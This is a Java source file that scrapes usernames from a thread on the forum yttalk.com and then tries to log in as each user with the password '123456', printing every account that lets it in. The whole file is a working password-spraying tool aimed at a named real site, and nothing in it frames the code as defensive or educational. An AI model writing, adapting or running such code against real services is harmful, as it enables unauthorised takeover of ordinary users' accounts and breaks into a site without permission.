package com.youtubers;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static sun.util.logging.LoggingSupport.log;


public class Requests {

    public Requests () {
        System.out.println("Scanning for users...");
        Map<String, User> userList = this.loadUsers();
        System.out.println("Users scanned: " + userList.size() + " users.");

        System.out.println("Sending Post requests...");
        this.sendPost(userList);

    }

    // Returns a HashMap with all userNames.
    public Map <String, User>  loadUsers () {
        try {
            Map <String, User> userList = new HashMap<>();
            String url = "http://yttalk.com/threads/who-are-your-favorite-youtubers.93000/page-";
            int numberOfPages = 2;

            for (int i = 1; i < numberOfPages; i++) {
                String page = String.valueOf(i);
                Document document = Jsoup.connect(url + page).get();
                Elements userNames = document.select("a.username");

                for (Element userName: userNames) {
                    if (!userList.containsKey(userName.html())) {
                        userList.put(userName.html() , new User(userName.html()));
                    }
                }
            }
            userList.put("juan123456" , new User("juan123456"));
            return userList;
        }
        catch (Exception e) {
            System.out.println(e);
            return null;
        }
    }

    public void sendPost (Map <String, User> userList) {
        try {
            String url = "http://yttalk.com/login/login";
            int userCount = 1;

            for (String user : userList.keySet()) {
                String userName = user;
                String password = "123456";

                Connection.Response response = Jsoup.connect(url)
                        .method(Connection.Method.POST)
                        .data("login", userName)
                        .data("password", password)
                        .userAgent("Mozilla/5.0")
                        .followRedirects(true)
                        .execute();

                if (!String.valueOf(response.url()).equals(url)) {
                    System.out.println("Login succesful: ***********");
                    System.out.println("Success - Username: " + userName + ", Password: " + password + " " + response.url() + "\n");
                }
                else {
                    System.out.println("Failed - user " + userCount++ + "/" + userList.size() + " " + response.url() + " " + userName + " " + password);
                }
            }
        }
        catch (Exception e) {
            System.out.println(e);
        }
    }
}
